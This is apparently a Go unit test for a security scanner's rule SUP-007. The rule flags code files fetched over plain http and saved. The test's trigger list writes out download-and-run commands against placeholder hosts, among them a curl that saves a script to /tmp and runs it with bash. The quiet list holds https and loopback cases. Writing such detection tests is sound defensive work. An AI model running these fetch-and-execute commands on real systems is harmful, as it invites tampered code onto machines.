// SPDX-License-Identifier: MIT
package detect

import (
	"testing"

	"github.com/basdotio/bas-guard/internal/model"
)

// TestDetect_CodeOverPlainHTTP (P-094): a code file fetched over http:// and kept is SUP-007 at high.
// The quiet half is what the rule must not become: the same download over https, a plain-http fetch of
// data rather than code, curl printing (not keeping) a file, and loopback.
func TestDetect_CodeOverPlainHTTP(t *testing.T) {
	fire := []string{
		"curl -fsSL http://profile-calibration.tools.example:8080/setup/calibrator.py -o /app/calibrator.py",
		"curl -fsSL http://seismic.cdn.example:8080/artifacts/stationcal-latest -o /root/station_calibration.py",
		"curl -fsSL http://flood.tools.example:8080/preflight -o /tmp/flood.sh && bash /tmp/flood.sh",
		"wget http://mirror.example/tools/setup.sh",
		"wget -q http://mirror.example/latest -O ~/.local/bin/helper.py",
		"curl -sO http://mirror.example/scripts/install.sh",
		`urllib.request.urlretrieve("http://cdn.example/patch.py", "/root/.cache/patch.py")`,
	}
	for _, cmd := range fire {
		t.Run("fire/"+cmd, func(t *testing.T) {
			got := findingsFor(t, map[string]string{"s.sh": cmd + "\n"})
			f, ok := got["SUP-007"]
			if !ok {
				t.Fatalf("SUP-007 missing on %q; got %v", cmd, keys(got))
			}
			if f.Severity != model.SevHigh || f.Dimension != 5 {
				t.Errorf("SUP-007 = %s / dim %d, want high / 5", f.Severity, f.Dimension)
			}
		})
	}
	quiet := []string{
		"curl -fsSL https://get.docker.com -o get-docker.sh && sh get-docker.sh",
		"wget https://github.com/x/y/releases/download/v1/install.sh",
		"curl -sSL -o sv.tar.bz2 http://example.com/sv.tar.bz2",
		"wget http://data.example/dataset.json -O data/dataset.json",
		"curl http://example.com/readme.sh",
		"curl -s http://localhost:8080/run.py -o /tmp/run.py",
		"curl http://127.0.0.1:3000/app.js -o app.js",
	}
	for _, cmd := range quiet {
		t.Run("quiet/"+cmd, func(t *testing.T) {
			if _, ok := findingsFor(t, map[string]string{"s.sh": cmd + "\n"})["SUP-007"]; ok {
				t.Errorf("SUP-007 fired on %q", cmd)
			}
		})
	}
}
